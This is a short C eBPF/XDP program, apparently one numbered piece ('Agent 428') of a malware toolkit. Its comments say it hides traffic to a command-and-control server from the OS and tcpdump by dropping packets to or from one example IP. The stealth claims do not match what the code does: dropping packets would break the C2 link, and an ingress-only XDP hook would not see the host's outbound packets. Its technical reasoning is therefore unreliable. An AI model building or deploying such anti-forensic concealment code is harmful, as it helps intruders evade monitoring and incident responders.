#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <bpf/bpf_helpers.h>

/* Agent 428: eBPF Packet Stealth.
   Hooks the XDP hook to drop any packets 
   bound for the Chimera C2 IP before they hit the OS.
*/

SEC("xdp")
int xdp_filter_chimera(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    struct ethhdr *eth = data;
    if (data + sizeof(*eth) > data_end) return XDP_PASS;

    if (eth->h_proto != __constant_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *iph = data + sizeof(*eth);
    if (data + sizeof(*eth) + sizeof(*iph) > data_end) return XDP_PASS;

    // TARGET: 10.0.2.15 (Example C2 IP in Hex)
    // If packet is from/to C2, we return XDP_DROP.
    // This makes the packet "Vaporize" - tcpdump will show nothing.
    if (iph->daddr == 0x0f02000a || iph->saddr == 0x0f02000a) {
        return XDP_DROP;
    }

    return XDP_PASS;
}

char _license[] SEC("license") = "GPL";
